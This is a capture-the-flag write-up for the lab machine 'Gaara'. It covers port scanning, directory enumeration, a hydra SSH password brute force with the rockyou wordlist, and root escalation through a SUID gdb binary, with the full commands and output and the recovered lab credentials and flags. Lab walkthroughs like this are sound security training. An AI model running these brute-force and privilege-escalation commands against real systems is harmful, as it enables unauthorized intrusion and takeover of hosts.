# Nmap
```bash
┌──(kali㉿kali)-[~/proving_grounds/Gaara]
└─$ sudo nmap -sSVC 192.168.148.142 -o nmap_scan_intial
Password: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-05 04:33 EDT
Nmap scan report for 192.168.148.142
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Gaara
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.34 seconds
```
# Port 80
Nothing here except for Image (jpeg)
![image](https://user-images.githubusercontent.com/60841283/117125932-c8896500-adb7-11eb-9bc7-1a0f080a9652.png)

# Gobuster
```bash
┌──(kali㉿kali)-[~/proving_grounds/Gaara]
└─$ gobuster -w dict.txt dir -u http://192.168.148.142/ -o dict_wiki
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.142/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                dict.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/05 04:58:17 Starting gobuster in directory enumeration mode
===============================================================
/Temari               (Status: 200) [Size: 16077]
/Kazekage             (Status: 200) [Size: 16077]
                                                 
===============================================================
2021/05/05 05:03:07 Finished
===============================================================
```
Let's check them
* /Temari
* /Kazekage

Same as Wikipedia page.
![image](https://user-images.githubusercontent.com/60841283/117126091-eeaf0500-adb7-11eb-888a-1ef96a74a174.png)

# SSH Brute force
```bash
┌──(kali㉿kali)-[~/proving_grounds/Gaara]
└─$ hydra -l gaara -P /opt/rockyou.txt 192.168.148.142 ssh     
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-05 05:21:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.148.142:22/
[STATUS] 130.00 tries/min, 130 tries in 00:01h, 14344273 to do in 1839:01h, 16 active
[22][ssh] host: 192.168.148.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-05 05:23:32


Creds -->
		User	Pass
		gaara	iloveyou2
```
## SSH Login
```bash
┌──(kali㉿kali)-[~/proving_grounds/Gaara]
└─$ ssh gaara@192.168.148.142                                                                                                                                          255 ⨯
The authenticity of host '192.168.148.142 (192.168.148.142)' can't be established.
ECDSA key fingerprint is SHA256:FcwbQsAC81pmtJrJ0OVscGkUUGMshggh5Mzj4Y659O0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/kali/.ssh/known_hosts).
gaara@192.168.148.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ pwd
/home/gaara
gaara@Gaara:~$ ls
flag.txt  local.txt
gaara@Gaara:~$ cat *
Your flag is in another file...
382908b335523f6c5be915f8e422baa5
gaara@Gaara:~$ 
```
# SUID
```bash
gaara@Gaara:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```
# GTFOBins
![image](https://user-images.githubusercontent.com/60841283/117126301-33d33700-adb8-11eb-9962-8bedbc630107.png)

# Priv Esc
```bash
gaara@Gaara:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
# cd /root
# cat *
f7df5fd3949682d73876e730693a2bc9
Your flag is in another file...
# 
```

Rooted !
